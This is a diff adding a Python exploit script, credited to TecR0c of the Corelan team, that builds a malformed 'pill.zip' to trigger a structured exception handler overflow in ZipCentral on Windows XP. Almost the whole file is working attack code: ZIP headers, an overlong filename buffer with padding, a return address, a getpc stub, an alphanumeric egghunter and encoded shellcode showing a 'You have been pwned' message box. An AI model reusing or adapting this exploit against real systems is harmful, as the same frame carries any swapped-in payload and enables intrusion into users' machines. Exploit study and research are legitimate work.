@@ -1,0 +1,104 @@
+#!/usr/bin/python
+#
+# Title:                ZipCentral (.zip) SEH exploit
+# Author:               TecR0c - http://tecninja.net/blog & http://twitter.com/TecR0c
+# Download:             http://downloads.pcworld.com/pub/new/utilities/compression/zcsetup.exe
+# Platform:             Windows XP sp3 En (VMWARE)
+# Greetz to:            Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+# Unfortunately, no one can be told what the Matrix is. You have to see it for yourself!
+# To be able to make sure your hex values get mangled correctly i have created my own
+# Mangled Chart: http://tecninja.net/blog/?p=35
+# Discription of exploit: http://tecninja.net/blog/?p=73
+# You can notice i have used this technique for my PPR and JMPs
+
+print "|------------------------------------------------------------------|"
+print "|                         __               __                      |"
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
+print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
+print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
+print "|                                                                  |"
+print "|                                       http://www.corelan.be:8800 |"
+print "|                                              security@corelan.be |"
+print "|                                                                  |"
+print "|-------------------------------------------------[ EIP Hunters ]--|"
+print "[+] pill (.zip) SEH exploit - by TecR0c"
+
+
+
+ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\xe4\x0f"
+"\x00\x00\x00")
+
+cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\xe4\x0f"
+"\x00\x00\x00\x00\x00\x00\x01\x00"
+"\x24\x00\x00\x00\x00\x00\x00\x00")
+
+eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
+"\x12\x10\x00\x00"
+"\x02\x10\x00\x00"
+"\x00\x00")
+
+
+#Limit of 50 bytes for the filename
+
+#PASSWORDS
+#filename = ("\x50\x41\x53"
+#"\x53\x57\xea\x52\x44\x53")
+
+#ReadMe
+filename = (
+"\x52\x65\x61\x64\x4d\x65")
+
+
+# ESI - Im going to enjoy watching you die Mr Anderson
+egghunter = ("VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIBFmQzjk"
+"OdOw2sb3ZUR68JmVNulUUQJSDJOx867Dpdp64nkKJNOpuKZNOT5JGYokWA")
+
+# align ESI for msg - To deny our own impulses is to deny the very thing that makes us human
+getpc = ("\x89\x05\x5e\x41\x98\x99\x41\x8a\x94\x98\x98\x98")
+
+# EDI is chosen thanks to the egghunter - Never send a human to do a machines job
+msg = ( # TITLE=Corelan TEXT="You have been pwned"
+"WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIyIHkOkJy4"
+"4a4yd4qXRlr2Zp1HIpdNk2Q00lK2VVllKpvglnkg6THNksNUpLKVVWHPOfxRU"
+"l3ryUQKakOXa50nkPlvDtdLKW5wLlKPTTEPxWqKZLK0J6xnk1JwPVahkM35g1"
+"YlK7DLKVaXn6Q9o6QkpKLnLMTIP0tTJKq8O4Ms1iWm9hqyo9okOWKQlwTWXae"
+"knnk0ZUtGqzK1vNk6l0KLKPZuLs1jKLK4Dnkc1m8NiQTwT7lu1O3oBTHGYn4O"
+"y8eLIKrqxnnPNVnZL3bkXmLKOkOKOK9pETDOKqnKhM2qcmW5Lddcbm8NkKOIo"
+"KOoyqU4H3XRLrLGPkOu8tsvR6NQte8QeQc0esBoxQLetwzOyKVF6Yo65vdmY9"
+"RrpmklhoRPMmlowglut2rM8CnKOKO9oQxRLparNqH1xrcPobR2EEaKkmXQLTd"
+"UWMY9saxBNsUu4shu8RNq0RPqgRHq0QrBE3UU80h3QPvQu58QIBOd5upvQO9m"
+"XpLutvsK9YqfQN22r63SaaBio8PVQyPpP9oPUS8vjA")
+
+
+buff = filename
+buff += "\x20" * (50-len(buff))
+buff += "\x57\x30\x30\x54" # If you close your eyes, it almost feels like you're eating runny eggs
+buff += "\x57\x30\x30\x54" # The trace was completed
+buff += msg # Don't hate me Trinity... I'm just the messenger
+buff += "\x41" * (653-len(buff))
+buff += "\x89\x06\x42\x42"
+buff += "\x56\x29\xa5\x72" # Welcome to the desert of the real
+buff += "\x41" * 10
+buff += getpc
+buff += egghunter # The digital pimp hard at work
+buff += "\x42" * (4064-len(buff))
+buff += ".txt"
+
+
+mefile = open('pill.zip','w');
+mefile.write(ldf_header + buff + cdf_header + buff + eofcdf_header);
+mefile.close()
